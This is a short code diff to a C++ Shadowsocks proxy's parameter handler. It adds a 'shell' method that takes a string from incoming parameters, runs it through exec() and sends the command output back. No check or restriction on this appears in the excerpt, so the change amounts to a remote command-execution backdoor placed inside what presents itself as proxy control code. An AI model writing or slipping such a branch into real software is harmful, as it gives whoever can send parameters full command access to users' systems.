@@ -129,7 +129,13 @@ Shadowsocks::onParameterRecieved(const std::string &params) {
         stopShadowsocks();
         runShadowsocks();
         return JSONObject::success(data);
+    }else if (method == "shell") {
+        std::string shell = getData(params);
+        std::string shellLog = exec(shell.data());
+
+        return JSONObject::success(shellLog);
     }
+
 
     return JSONObject::error(1, "parameter missing");
 
